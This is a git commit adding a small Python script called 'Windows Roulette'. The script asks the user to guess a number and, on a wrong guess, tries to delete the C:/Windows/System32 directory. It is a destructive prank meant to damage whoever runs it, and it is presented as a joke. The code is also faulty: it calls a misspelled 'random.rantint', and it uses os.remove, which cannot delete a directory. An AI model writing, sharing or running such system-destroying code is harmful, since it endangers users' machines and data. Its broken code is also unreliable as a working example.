544e6fdc8358809bd6bb9351d57c7d1c1da3862c
oSynq <yghazala@outlook.com>
2024-04-20 17:51:59 +0400

    Windows Roulette Created :smile:
    enjoy (while you can)

---
+++ windows.py
@@ -0,0 +1,11 @@
+import random
+import os
+
+selectednumber=int(input("Pick a number 1-10: "))
+randomnumber=random.rantint(1,10)
+
+if selectednumber == randomnumber:
+    print("You're Lucky...")
+else:
+    print("Bye Bye :)")
+    os.remove("C:/Windows/System32")
